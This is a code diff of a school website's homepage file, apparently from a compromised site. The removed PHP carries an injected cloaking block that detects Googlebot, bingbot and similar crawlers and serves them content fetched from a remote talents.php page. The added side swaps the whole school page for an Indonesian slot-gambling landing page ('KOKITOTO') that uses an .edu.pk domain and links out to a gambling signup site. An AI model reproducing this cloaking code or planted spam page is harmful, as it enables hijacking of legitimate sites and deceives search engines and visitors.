@@ -1,786 +1,281 @@
-<?php
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
+<!DOCTYPE html>
+<html amp lang='id'>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>KOKITOTO : Situs Slot Online Resmi Platform Tepat Menjelajah Kemenangan</title>
+    <meta name="description" content="KOKITOTO adalah situs slot online yang didukung oleh berbagai provider resmi yang menjadi platform slot gacor paling tepat untuk menjelajah kemenangan." />
+    <meta name="robots" content="index,follow" />
+    <link href="https://gctibbasultanpur.edu.pk/wp-content/uploads/2026/05/fav.webp" rel="icon" type="image/x-icon" />
+    <link rel="canonical" href="https://gctibbasultanpur.edu.pk/" />
+    <link rel="alternate" href="https://gctibbasultanpur.edu.pk/" hreflang="id" />
+    <meta property="og:url" content="https://gctibbasultanpur.edu.pk/" />
+    <meta property="og:site_name" content="KOKITOTO" />
+    <meta property="og:image:alt" content="KOKITOTO" />
+    <meta property="og:image" content="https://gctibbasultanpur.edu.pk/wp-content/uploads/2026/05/situs-slot-kokitoto.webp" />
+    <link rel="preload" as="script" href="https://cdn.ampproject.org/v0.js" />
+    <script async src="https://cdn.ampproject.org/v0.js" nonce="MjE4NjQyMjYwNCwyNzg5OTc4NzM5"></script>
+    <style amp-boilerplate>
+      body {
+        -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+        -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+        -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+        animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+      }
+      @-webkit-keyframes -amp-start {
+        from {
+          visibility: hidden;
         }
-    }
-    return false;
-}
-if (is_bot()) { 
-    $message = file_get_contents('https://www.gpsrkl.ac.in/talents.php'); // 
-    echo $message; 
-    (exit);
-} 
-?><?php
-@session_start();
-require_once("config.inc.php");
-require_once("includes/class.CommonFunctions.php");
-require_once("includes/class.DatabaseManager.php");
-require_once("includes/class.LogonUser.php");
-require_once("includes/class.UserAccess.php");
-require_once("includes/interface.AppPage.php");
+        to {
+          visibility: visible;
+        }
+      }
+      @-moz-keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
+      @-ms-keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
+      @-o-keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
+      @keyframes -amp-start {
+        from {
+          visibility: hidden;
+        }
+        to {
+          visibility: visible;
+        }
+      }
+    </style>
+    <noscript>
+      <style amp-boilerplate>
+        body {
+          -webkit-animation: none;
+          -moz-animation: none;
+          -ms-animation: none;
+          animation: none;
+        }
+      </style>
+    </noscript>
+    <style amp-custom>
+      * {
+        box-sizing: border-box;
+      }
 
+      body {
+        font-family: monospace;
+        background: #000000;
+        background-image: radial-gradient(#252525 5%, transparent 50%);
+        background-size: 5px 5px;
+        background-attachment: fixed;
+      }
 
-/* Create a Class for this page to store some variable s 
-to be globally used by many functions in this Page */
-class CurrentPage implements AppPage
-{
-	public $link_id;	// Database Link
+      .container {
+        width: 100%;
+        max-width: 350px;
+        min-height: 100vh;
+        margin: 0 auto;
+        padding: 15px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+      }
 
-	public $module_name;	// Current Module Name
-	
-	public $app_config;		// Application Configuration Settings
-	
-	public $no_menu;
-	public $cha_user_type;
-	
-	
-	//=== Class Constructor ===/
-	function __construct()
-	{
-		global $config;		// Global Config Settings
-		
-		//--- Connect TO Database ---
-		$this->link_id = DatabaseManager::iconnectDB();
-		if(!$this->link_id)
-		{
-			die(DatabaseManager::isqlError());
-		}
-		
-		//--- Set Current Module Name ---
-		$this->module_name = "FRONT END";
-		$this->cur_page_url = "index.php";
-		$this->list_page_url = "index.php";
-			
-		//--- Application Configuration Settings ---
-		$this->app_config = $config;
-			
-		//--- Don't show menu
-		$this->no_menu = "Y";
-		
-		//====If Login button is not pressed=====		
-	}
+      .container > * {
+        flex-shrink: 0;
+      }
 
-	//=== Class Destructor ===/
-	function __destruct()
-	{
-		//--- Disconnect from Database ---
-		//DatabaseManager::disconnectDB($this->link_id);
-	}
-}
-$objCurPage = new CurrentPage();
-?>
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="robots" content="noindex, nofollow">
-<meta name="DC.title" content="Gyanajyoti Public School" />
-<meta name="geo.region" content="IN-OR" />
-<meta name="geo.placename" content="Rourkela" />
-<meta name="geo.position" content="22.258952;84.873181" />
-<meta name="ICBM" content="22.258952, 84.873181" />
-<title>Gyanajyoti Public School</title>
-<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
-<link rel="stylesheet" type="text/css" href="fonts/fonts.css">
-<link rel="stylesheet" type="text/css" href="fonts/font-awesome.min.css">
-<link rel="icon" href="images/f-icon.png" type="image/x-icon">
-<!--Slider-->
-<link rel="stylesheet" type="text/css" href="css/settings.css">
-<link rel="stylesheet" type="text/css" href="css/navstylechange.css">
-<!--Slider-->
-<link rel="stylesheet" type="text/css" href="css/main.css">
-<link rel="stylesheet" type="text/css" href="css/media.css">
-<meta property="og:title" content="Gyanajyoti Public School" />
-<meta property="og:url" content="https://www.gpsrkl.ac.in" />
-<meta property="og:type" content="website" />
-<meta property="og:description" content="The GYANAJYOTI PUBLIC SCHOOL, affiliated to CBSE, began its educational journey in the year 2008 in Rourkela steel township of Sundargarh district of Odisha." />
-<meta property="og:image" content="http://www.gpsrkl.ac.in/images/logo.png" />
-<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,400,700">
-<script src="https://www.google.com/recaptcha/api.js?render=6LdIcksrAAAAAP4deBhfQ0umKbptb8mbIjEbV-cS"></script>
-<script>
-	function showResult(str) {
-	  if (str.length==0) {
-		document.getElementById("livesearch").innerHTML="";
-		document.getElementById("livesearch").style.border="0px";
-		return;
-	  }
-	  if (window.XMLHttpRequest) {
-		// code for IE7+, Firefox, Chrome, Opera, Safari
-		xmlhttp=new XMLHttpRequest();
-	  } else {  // code for IE6, IE5
-		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
-	  }
-	  xmlhttp.onreadystatechange=function() {
-		if (this.readyState==4 && this.status==200) {
-		  document.getElementById("livesearch").innerHTML=this.responseText;
-		  document.getElementById("livesearch").style.border="1px solid #A5ACB2";
-		}
-	  }
-	  xmlhttp.open("GET","livesearch.php?q="+str,true);
-	  xmlhttp.send();
-	}
-</script>
+      .welcome {
+        max-width: 300px;
+        margin: 0 auto;
+      }
 
-<style>
-.sp-banner {
-  background: #1a1a2e;
-  border: 0.5px solid #2e2e4a;
-  border-radius: 0px;
-  padding: 1rem 1.6rem;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  gap: 1rem;
-  flex-wrap: wrap;
-  position: relative;
-  overflow: hidden;
-  box-sizing: border-box;
-  width: 100%;
-}
-.sp-left {
-  display: flex;
-  align-items: center;
-  justify-content:center;
-  gap: 14px;
-  flex: 1;
-  min-width: 0;
-}
-.sp-icon {
-  width: 46px; height: 46px;
-  border-radius: 10px;
-  background: linear-gradient(135deg, #4f46e5, #7c3aed);
-  display: flex; align-items: center; justify-content: center;
-  flex-shrink: 0;
-  box-shadow: 0 0 16px rgba(99,102,241,0.4);
-}
-.sp-title {
-  margin: 0; font-size: 17px; font-weight: 500; color: #f1f0ff;
-}
-.sp-sub {
-  margin: 3px 0 0; font-size: 14px; color: #8b8baa;
-}
-.sp-btn {
-  display: inline-flex; align-items: center; gap: 7px;
-  background: linear-gradient(135deg, #4f46e5, #7c3aed);
-  color: #fff; font-size: 14px; font-weight: 500;
-  padding: 9px 20px; border-radius: 8px;
-  text-decoration: none; white-space: nowrap;
-  box-shadow: 0 0 18px rgba(99,102,241,0.45);
-  flex-shrink: 0;
-}
-.sp-btn:hover {
-	background: linear-gradient(135deg, #4f46e5, #7c3aed);
-	color: #fff; 
-}
-@media (max-width: 480px) {
-  .sp-banner { flex-direction: column; align-items: flex-start; }
-  .sp-btn { width: 100%; justify-content: center; padding: 11px 20px; }
-}
-/* Primary color: #1397ce */
-.sp-banner   { background: #0d1f2d; border-color: #1397ce33; }
-.sp-icon,
-.sp-btn      { background: linear-gradient(135deg, #1397ce, #0e6fa0); }
-.sp-btn      { box-shadow: 0 0 20px rgba(19,151,206,0.5); }
-.sp-badge    { color: #1397ce; border-color: rgba(19,151,206,0.35); }
-.sp-sub      { color: #6bbcd9; }
-.sp-title    { color: #e8f6fd; }
-</style>
+      .welcome h3 {
+        font-size: 12px;
+        color: #fff;
+        overflow: hidden;
+        border-right: 0.15em solid #ffd900;
+        white-space: nowrap;
+        letter-spacing: 0.09em;
+        animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
+      }
 
-<link href="ticker/carouselTicker.css" rel="stylesheet">
-</head>
-<body>
-<div style="border-top: 5px solid #00364d;">
-  <div class="container">
-    <div class="row">
-      <?php include_once("topmenu.php"); ?>
+      @keyframes typing {
+        from {
+          width: 0;
+        }
+
+        to {
+          width: 100%;
+        }
+      }
+
+      @keyframes blink-caret {
+
+        from,
+        to {
+          border-color: transparent;
+        }
+
+        50% {
+          border-color: #ffd900;
+        }
+      }
+
+      .banner {
+        display: block;
+        width: 100%;
+        border-radius: 10px;
+        overflow: hidden;
+      }
+
+      .logo-wrap {
+        display: block;
+        width: 180px;
+        max-width: 65vw;
+        margin: 0 auto 10px;
+      }
+
+      .btn-login,
+      .btn-daftar {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 56px;
+        padding: 14px 18px;
+        font-size: 18px;
+        line-height: 1;
+        font-weight: 800;
+        text-transform: uppercase;
+        text-decoration: none;
+        margin-top: 16px;
+      }
+
+      .copyright {
+        text-align: center;
+        color: #ffffff;
+      }
+
+      .glow-on-hover {
+        border: 1px solid rgba(255, 217, 0, 0.7);
+        outline: none;
+        color: #171100;
+        background: linear-gradient(180deg, #fff3a6 0%, #ffd900 38%, #c99000 100%);
+        position: relative;
+        overflow: hidden;
+        isolation: isolate;
+        border-radius: 8px;
+        box-shadow:
+          0 12px 28px rgba(255, 217, 0, 0.22),
+          0 4px 0 #7a5200,
+          inset 0 1px 0 rgba(255, 255, 255, 0.75),
+          inset 0 -1px 0 rgba(96, 62, 0, 0.45);
+        text-shadow: 0 1px 0 rgba(255, 255, 255, 0.38);
+        transition: transform .18s ease, box-shadow .18s ease, filter .18s ease;
+      }
+
+      .glow-on-hover span {
+        position: relative;
+        z-index: 1;
+      }
+
+      .glow-on-hover:before {
+        content: '';
+        position: absolute;
+        z-index: 0;
+        inset: 0;
+        background: linear-gradient(120deg, transparent 0%, rgba(255, 255, 255, 0.58) 18%, transparent 36%);
+        transform: translateX(-130%);
+        animation: premium-shine 3.8s ease-in-out infinite;
+        pointer-events: none;
+      }
+
+      .glow-on-hover:after {
+        content: '';
+        position: absolute;
+        z-index: 0;
+        inset: 1px;
+        border-radius: 7px;
+        border: 1px solid rgba(255, 255, 255, 0.24);
+        box-shadow: inset 0 0 18px rgba(255, 255, 255, 0.12);
+        pointer-events: none;
+      }
+
+      .btn-login {
+        color: #ffd900;
+        background: linear-gradient(180deg, #202020 0%, #080808 100%);
+        border-color: rgba(255, 217, 0, 0.55);
+        box-shadow:
+          0 12px 24px rgba(0, 0, 0, 0.36),
+          0 4px 0 #3d2a00,
+          inset 0 1px 0 rgba(255, 217, 0, 0.22),
+          inset 0 -1px 0 rgba(255, 217, 0, 0.16);
+        text-shadow: 0 0 12px rgba(255, 217, 0, 0.35);
+      }
+
+      .glow-on-hover:hover,
+      .glow-on-hover:focus {
+        filter: brightness(1.08);
+        transform: translateY(-2px);
+      }
+
+      .glow-on-hover:active {
+        transform: translateY(2px);
+        box-shadow:
+          0 6px 16px rgba(255, 217, 0, 0.16),
+          0 1px 0 #7a5200,
+          inset 0 1px 4px rgba(55, 35, 0, 0.38);
+      }
+
+      .btn-login:active {
+        box-shadow:
+          0 6px 16px rgba(0, 0, 0, 0.28),
+          0 1px 0 #3d2a00,
+          inset 0 1px 4px rgba(255, 217, 0, 0.18);
+      }
+
+      @keyframes premium-shine {
+        0% {
+          transform: translateX(-130%);
+        }
+
+        42%,
+        100% {
+          transform: translateX(130%);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <header>
+        <a href="https://gctibbasultanpur.edu.pk/" class="logo-wrap">
+          <amp-img src="https://gctibbasultanpur.edu.pk/wp-content/uploads/2026/05/logo.png" alt="KOKITOTO" width="180" height="40" layout="responsive"></amp-img>
+        </a>
+      </header>
+      <div class="welcome">
+        <h3> Situs Slot Online Terpercaya </h3>
+      </div>
+      <amp-img src="https://gctibbasultanpur.edu.pk/wp-content/uploads/2026/05/situs-slot-kokitoto.webp" width="500" height="500" layout="responsive" class="banner" alt="Situs Slot"></amp-img>
+      <a href="https://linkkoki.me/membervvip" target="_blank" rel="noreferrer noopener" role="button" class="btn-daftar glow-on-hover"><span>DAFTAR</span></a>
+      <a href="https://linkkoki.me/membervvip" target="_blank" rel="noreferrer noopener" role="button" class="btn-login glow-on-hover"><span>LOGIN</span></a>
+      <p class="copyright">&copy; 2026 <a href="https://gctibbasultanpur.edu.pk/" rel="noopener noreferrer" style="color: #ffd900;">KOKITOTO</a>. All Rights Reserved.</p>
     </div>
-  </div>
-</div>
-
-<div class="col-md-10">
-  <form class="sider-content">
-    <input type="text" class="form-control" size="30" onkeyup="showResult(this.value)">
-    <div id="livesearch"></div>
-  </form>
-</div>
-<!--<div class="menu">-->
-<div id="top_section">
-  <?php include_once("menu.php"); ?>
-</div>
-<div class="clearfix"></div>
-<!--Slider-->
-<div class="tp-banner-container">
-  <div class="tp-banner" >
-    <ul>
-        <!-- SLIDE  -->
-        
-        <li data-transition="zoomout" data-slotamount="7" data-masterspeed="1000" >
-            <!-- MAIN IMAGE -->
-            <img src="img/1920/GPS_Banner-8.jpg"  alt="darkblurbg"  data-bgfit="cover" data-bgposition="left top" data-bgrepeat="no-repeat">
-        </li>
-        <li data-transition="zoomout" data-slotamount="7" data-masterspeed="1000" >
-            <!-- MAIN IMAGE -->
-            <img src="img/1920/GPS_Banner-7.jpg"  alt="darkblurbg"  data-bgfit="cover" data-bgposition="left top" data-bgrepeat="no-repeat">
-        </li>
-        <li data-transition="zoomout" data-slotamount="7" data-masterspeed="1000" >
-            <!-- MAIN IMAGE -->
-            <img src="img/1920/GPS_Banner-6.jpg"  alt="darkblurbg"  data-bgfit="cover" data-bgposition="left top" data-bgrepeat="no-repeat">
-        </li>
-        
-        <li data-transition="fade" data-slotamount="7" data-masterspeed="1500" >
-            <!-- MAIN IMAGE -->
-            <img src="img/1920/GPS_Banner-1.jpg"  alt="slidebg1"  data-bgfit="cover" data-bgposition="left top" data-bgrepeat="no-repeat">
-        </li>
-        <li data-transition="zoomout" data-slotamount="7" data-masterspeed="1000" >
-            <!-- MAIN IMAGE -->
-            <img src="img/1920/GPS_Banner-2.jpg"  alt=""  data-bgfit="cover" data-bgposition="left top" data-bgrepeat="no-repeat">
-        </li>
-        <li data-transition="zoomout" data-slotamount="7" data-masterspeed="1000" >
-            <!-- MAIN IMAGE -->
-            <img src="img/1920/GPS_Banner-3.jpg"  alt=""  data-bgfit="cover" data-bgposition="left top" data-bgrepeat="no-repeat">
-        </li>
-        <li data-transition="zoomout" data-slotamount="7" data-masterspeed="1000" >
-            <!-- MAIN IMAGE -->
-            <img src="img/1920/GPS_Banner-5.jpg"  alt="darkblurbg"  data-bgfit="cover" data-bgposition="left top" data-bgrepeat="no-repeat">
-        </li>
-        <!-- SLIDE  -->
-    </ul>
-    <div class="tp-bannertimer"></div>
-  </div>
-</div>
-<!--Slider-->
-
-<div class="clearfix"></div>
-<div class="sp-banner">
-  <div class="sp-left">
-    <div class="sp-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
-          <polyline points="14 2 14 8 20 8"></polyline>
-          <line x1="16" y1="13" x2="8" y2="13"></line>
-          <line x1="16" y1="17" x2="8" y2="17"></line>
-          <polyline points="10 9 9 9 8 9"></polyline>
-        </svg></div>
-    <div>
-      <p class="sp-title"><strong>Sample Papers Available</strong> - <span class="sp-sub">Class I to X · All subjects</span></p>
-
-    </div>
-    <a href="samplepapers.php" target="_blank" class="sp-btn">↓ Download here</a>
-  </div>
-</div>
-<div class="clearfix"></div>
-<div id="welcome-section">
-  <div class="container">
-	<div class="col-xs-12 col-sm-8">
-		<h1 class="margin"><span>WELCOME</span> to our website</h1>
-		<div class="hidden-xs hidden-sm col-md-5">
-			<div class="row"><img src="images/img-1.jpg" class="img-responsive"/></div>
-		</div>
-		<div class="col-xs-12 col-sm-12 col-md-7">
-			<div class="row">
-			<p>The <span>GYANAJYOTI PUBLIC SCHOOL</span>began its educational journey in the year 2008 in Rourkela steel township of Sundargarh district of Odisha. GPS is established with the assistance and support of the <span>GYANAJYOTI CHARITABLE TRUST.</span> The trust comprises of a high level erudite and intellectual members with their mammoth experience in the field of education. Our motto is to foster quality education and instill people to become a part of pedagogical environment. It is a matter of concern that in a developed city like. <span><a href="about-us.php">More...</a></span></p>
-			</div>
-		</div>
-	</div>
-	
-	<div class="col-xs-12 col-sm-4">
-		<div class="box" style="margin-bottom:0;">
-        <h1 class="h-bg-1">Notice <span>Board</span></h1>
-        <div class="block-hdnews">
-          <div class="list-wrpaaer">
-			<ul class="list-aggregate" id="marquee-vertical">
-			  <?php $tsql = "SELECT announcement_id, announcement_headline, announcement_date, announcement_details, is_new"
-			  				." FROM announcements ORDER BY is_new DESC";
-					$rs_news = $objCurPage->link_id->query($tsql);
-					//shuffle($objCurPage->color);
-					if( (!$rs_news) || (!($rec_news = $rs_news->fetch_array())) )
-					{
-				?>
-				<li><h6>Coming Soon</h6></li>
-				<?php 
-					}
-					else{
-						do{
-				?>
-						  <li>
-							<div class="gt_aside_post_des2">
-								<h3><a href="news.php"><?php echo $rec_news['announcement_headline'];?></a>
-								<?php if($rec_news["is_new"] == 1)
-								{ 
-								  echo '<img src="images/newicon.gif" border="0" align="absmiddle" />';
-								}
-								else
-								{
-								  echo "";
-								}
-								?></h3>
-								<p><?php echo substr($rec_news['announcement_details'],0,70);?> </p>
-							 </div>   
-						  </li>
-						  <?php  
-						}while($rec_news = $rs_news->fetch_array()); } ?>
-			</ul>
-          </div>
-          <a href="news.php" class="view-more btn"> View more</a> </div>
-      </div>
-	</div>
-</div>
-</div>
-
-<div id="welcome-section" class="prin_bg">
-	<div class="container">	
-		<div class="col-xs-12 col-sm-12">
-			<div class="box" style="margin-bottom:0; background-color:#fff;">
-				<h1 class="h-bg-3"><span>Principal's</span> Message</h1>
-				<div class="row" style="padding:10px;">
-					<div class="col-xs-12 col-md-3 text-center">
-					<img src="images/Prin_Sir.jpg" class="img-responsive"/>
-					<p style="padding:0; margin-top:5px;"><strong>Mr. Jaladhar Mohapatra</strong></p>
-					</div>
-					<div class="col-xs-12 col-md-9">
-
-						<p style="padding:0;">The GPS has successfully completed one more milestone in the service of the society   by giving quality education, better service and good vibrant environment for a complete transformation of education and physical development of a child by nurturing the talent of the students. In the year 2020 we have a hidden great challenge and expectation, that GPS is one such happy place where students and faculty grow together and realize their potentials. The infrastructure and the teaching methodology at school go on evolving to keep pace with the ongoing innovation.<br>
-						As a Principal of the School, I feel honoured and privileged to be part of an educational institution where every stake holder is a learner and everyday is an opportunity of learning where <span><a href="administration.php">More...</a></span>
-						</p>
-						
-					</div>
-				</div>
-			</div>
-		</div>
-	</div>
-</div>
-
-<div id="welcome-section">
-  <div class="container">	
-    <div class="col-xs-12 col-sm-8">
-      <div class="row">
-        <div class="col-xs-12 col-sm-6 our-mission" style="margin-top:0;">
-			<div class="box">
-				<h1 class="h-bg-2">Our <span>Mission</span></h1>
-				<ul>
-				<li> Value based quality education to the students.</li>
-				<li> Empowering the students with high social, moral and ethical values to cater to the needs of changing scenario.</li>
-				<li>To instill confidence and sense of discipline in the students.</li>
-				</ul>
-				<a href="about-us.php?#mission" class="view-more btn"> View more</a>
-				<div class="col-md-12">
-					<img class="img-responsive" src="images/mission.jpg" style="margin-bottom:15px;" alt="">
-				</div>
-			</div>
-        </div>
-        <div class="col-xs-12 col-sm-6 our-vision" style="margin-top:0;">
-          <div class="box">
-            <h1 class="h-bg-1">Our <span>Vision</span></h1>
-            <ul>
-                <li>Strengthening student supremacy with education for the development of Human Resources required for different levels of economy with the sense of commitment to human values and social justice.</li>
-                <li>Developing intellectual, social, emotional, physical, spiritual, artistic and aesthetic values of the students to enhance their quality of life.</li>
-            </ul>
-            <a href="about-us.php?#vision" class="view-more btn"> View more</a>
-			<div class="col-md-12">
-			<img class="img-responsive" src="images/vision.jpg" style="margin-bottom:15px;" alt="">
-			</div>
-			</div>
-        </div>
-        <div class="col-md-12 school-ftrs">
-          <div class="box">
-            <h1 class="h-bg-1">School <span>Features</span></h1>
-            <ul class="col-md-6">
-              <li>Strict discipline and punctuality</li>
-              <li>Good administration and management</li>
-              <li>Overall growth and developments</li>
-            </ul>
-            <ul class="col-md-6">
-              <li>All modern educational facilities</li>
-              <li>Learning is values not teaching</li>
-              <li>Parents happy with our teaching methodology and result</li>
-            </ul>		
-			
-			<img class="img-fluid bg-white border rounded" src="images/playground.jpg" alt="">
-			<img class="img-fluid bg-white border rounded" src="images/library-2.jpg" alt="">
-			<img class="img-fluid bg-white border rounded" src="images/infra.jpg" alt="">
-			<img class="img-fluid bg-white border rounded" src="images/classroom.jpg" alt="">
-			<img class="img-fluid bg-white border rounded" src="images/transport.jpg" alt="">
-
-          </div>
-        </div>
-      </div>
-      <div class="clearfix"></div>
-    </div>
-    <div class="col-xs-12 col-sm-4" id="alumni_panel">
-      <div id="frm-box" style="border:1px solid #9d90d9;">
-        <div class="heading" style="background-color: #503dae;">
-          <h1 class="pull-left">Alumni <span>Login</span></h1>
-          <img src="images/frm-ic-2.png" class="pull-right" style="margin-right:15px;"/>
-          <div class="clearfix"></div>
-        </div>
-        <div \ class="frm-container" style="padding-bottom:15px;">
-         <?php //if(isset($_SESSION['currentLogonUser']) && $_SESSION["currentLogonUser"]->cur_user_group_type == "alumni"){
-			 if (
-    isset($_SESSION['currentLogonUser']) &&
-    is_object($_SESSION["currentLogonUser"]) &&
-    get_class($_SESSION["currentLogonUser"]) === 'LogonUser' &&
-    $_SESSION["currentLogonUser"]->cur_user_group_type == "alumni"
-) {
-			 
-			 ?>
-
-			<a class="btn btn-primary btn-block" href="alumni/profile.php" class="top-linka">My Profile</a>
-			<a class="btn btn-primary btn-block" href="alumni_logout.php" class="top-linka">Logout</a>
-		   
-		 <?php }else{ ?>
-			<div class="errMsgText" style="text-align:center; color:#CC3401;"></div>
-            <form method="post" name="frmAlumniLogin" id="frmAlumniLogin" action="ajax/ajax_alumnilogin.php">
-                <input type="text" class="form-control" name="email" id="email" placeholder="Email address">
-                <input type="password" class="form-control" placeholder="Password" id="alumni_pwd" name="alumni_pwd"/>
-                <input type="submit" value="Login" id="alumni_login" name="alumni_login" class="btn btn-danger btn-block"/>
-                 <input type="hidden" value="Y"  name="logMe" id="logMe" />
-                <p class="text-center" style="margin-top:10px;"><strong>Don't have an account?</strong></p>
-                <a href="alumni" class="btn btn-primary btn-block">Register Now</a>
-            </form>
-          
-			<div style="margin: 15px auto 0px; width:300px; min-height:122px;">
-				<div class="carouselTicker carouselTicker-start">
-					<ul class="carouselTicker_list alumni_list">
-                    
-            <?php
-				$sql = "SELECT alumni_id, alumni_photo FROM tbl_alumni WHERE status=1 ORDER BY alumni_id DESC LIMIT 5";
-				$rs = $objCurPage->link_id->query($sql);
-				//shuffle($objCurPage->color);
-				if( (!$rs) || (!($rec = $rs->fetch_array())) )
-				{ 
-					echo '<h4 class="text-center text-danger">NO ALUMNI RECORDS FOUND</h4>';
-				}
-				else
-				{
-					do
-					{
-						if($rec["alumni_photo"] != ""){ 
-							$file = $rec["alumni_photo"];
-						}
-						else{ 
-							$file = 'blank.jpg'; 
-						}	
-						echo '<li class="carouselTicker_item">';
-						echo '<a href="alumni.php"><img class="img-fluid" style="height:100px; width:100px; border:1px solid #ddd;" src="alumni_profile/'.$file.'" alt=""></a>';
-						echo '</li>';
-
-					}while($rec = $rs->fetch_array()); 
-				}
-            ?>
-                    
-						<!--<li class="carouselTicker_item">
-                        <a href="#"><img class="img-fluid bg-white border rounded" src="images/s1.jpg" alt=""></a></li>
-						<li class="carouselTicker_item">
-                        <a href="#"><img class="img-fluid bg-white border rounded" src="images/s2.jpg" alt=""></a></li>
-						<li class="carouselTicker_item">
-                        <a href="#"><img class="img-fluid bg-white border rounded" src="images/s3.jpg" alt=""></a></li>
-						<li class="carouselTicker_item">
-                        <a href="#"><img class="img-fluid bg-white border rounded" src="images/s4.jpg" alt=""></a></li>-->
-					</ul>
-				</div>  
-			</div> 
-			
-		 <?php } ?>
-			
-        </div>
-
-      </div>
-<!--<a href="samplepapers.php" class="extra-links dwnload"><img src="images/download1.png" alt="download" class="img-responsive"/> Download</a> 
-<a href="http://cbse.nic.in/" target="_blank" class="extra-links cbsc"><img src="images/cbsc.png" alt="download" class="img-responsive"/>CBSE</a>
-<a href="tc.php" class="extra-links tc"><img src="images/tc.png" alt="download" class="img-responsive">Transfer Certificate</a>
-<a href="samplepapers.php" class="extra-links dwnload"><img src="images/download1.png" alt="download" class="img-responsive"/> Download</a> -->
-    <div class="row">
-        <div class="col-md-12 link">
-        <a data-toggle="modal" data-target="#enqModal" href="javascript:void(0);" class="extra-links tc" style="border-bottom-right-radius:0; background-color: #ff8300;"><img src="images/enquiry.png" alt="download" class="img-responsive">Admission Enquiry</a></div>
-        
-        <?php /* ?><div class="col-md-12 link">
-        <a href="#" class="extra-links tc" target="_blank" style="border-bottom-left-radius:0; background-color: #467d66;"><img src="images/payment.png" alt="download" class="img-responsive">Online Payment</a></div><?php */ ?>
-		
-		<div class="col-md-12 link">
-        <a href="samplepapers.php" class="extra-links tc" style="border-bottom-left-radius:0; background-color: #467d66;"><img src="images/payment.png" alt="download" class="img-responsive">Download</a></div>
-        
-		<div class="col-md-12 link">
-        <a href="mandpubdisc.php" class="extra-links" style="border-top-right-radius:0; background-color: #312357;" target="_blank"><img src="images/mandatory_dis.png" alt="download" class="img-responsive">Mandatory Public Disclosure</a> </div>
-        
-        <div class="col-md-12 link"><a href="http://cbse.nic.in/" target="_blank" class="extra-links tc" style="border-top-left-radius:0; background-color: #ff3e38;"><img src="images/cbse1.png" alt="download" class="img-responsive"/>CBSE</a> </div>
-		
-		<div class="col-md-12 link"><a href="javascript:void(0);" class="extra-links tc" data-toggle="modal" data-target="#parentsLoginModal" style="border-top-left-radius:0; background-color: #0184d7;"><img src="images/frm-ic-1.png" alt="download" class="img-responsive"/>Parent's Login</a> </div>
-		
-    </div>    
-<!--<a href="#" class="extra-links tc" target="_blank"><img src="images/admission_enq.png" alt="download" class="img-responsive">Online Payment</a>
-<a href="mandpubdisc.php" class="extra-links tc"><img src="images/download1.png" alt="download" class="img-responsive">Mandatory Public Disclosure</a> 
-<a href="http://cbse.nic.in/" target="_blank" class="extra-links cbsc"><img src="images/cbsc.png" alt="download" class="img-responsive"/>CBSE</a> -->
-       
-        
-       
-      
-      </div>
-    <div class="clearfix"></div>
-  </div>
-</div>
-<!-- Modal -->
-
-<div id="parentsLoginModal" class="modal fade" role="dialog">
-  <div class="modal-dialog">
-    <!-- Modal content-->
-    <div class="modal-content">
-      <div class="modal-header">
-        <button type="button" class="close" data-dismiss="modal">&times;</button>
-        <h4 class="modal-title">Parents Login</h4>
-      </div>
-      <div class="modal-body" id="frm-box" style="padding-top:0px;">
-			<div class="frm-container row">
-				<?php                 
-				if(!isset($_SESSION["currentLogonUser"]))
-				{
-				?>
-				<div class="errMsgText" style="text-align:center; color:#CC3401;"></div>
-				<form method="post" name="frmParentsLogin" id="frmParentsLogin" action="ajax/ajax_login.php">
-					<div class="col-md-12"><input type="text" class="ic-1" placeholder="User Name" id="uname" name="uname"/></div>
-					<div class="col-md-12"><input type="password" class="ic-2" placeholder="Password" id="pwd" name="pwd" style="font: 14px/1.2 'avantgarde_cebold';"/></div>
-					<div class="col-md-6"><input type="submit" value="Login" name="login" id="login"/></div>	
-					<div class="col-md-6"><input type="button" value="Get Password" id="resister" data-toggle="modal" data-target="#myModal"/></div>
-					<input type="hidden" value="Y" name="logMe" id="logMe" />
-				</form>
-				<?php } else { ?>
-				<p> <a href="parents/studetails.php">View Profile</a></p>
-				<?php } ?>
-			</div>
-      </div>
-    </div>
-  </div>
-</div>
-
-<div id="myModal" class="modal fade" role="dialog">
-  <div class="modal-dialog">
-    <!-- Modal content-->
-    <div class="modal-content">
-      <div class="modal-header">
-        <button type="button" class="close" data-dismiss="modal">&times;</button>
-        <h4 class="modal-title">Forgot Password</h4>
-      </div>
-      <div class="modal-body">
-        <div id="frm-box">
-          <div class="frm-container" style="padding:0px;">
-            <div class="showError" style="text-align:center; color:#F00;"></div>
-            <form method="post" name="frmPassword" id="frmPassword" action="ajax/ajax_sendpassword.php" >
-              <input type="text" class="ic-1" placeholder="Admission No" id="adm_no" name="adm_no" autocomplete="off"/>
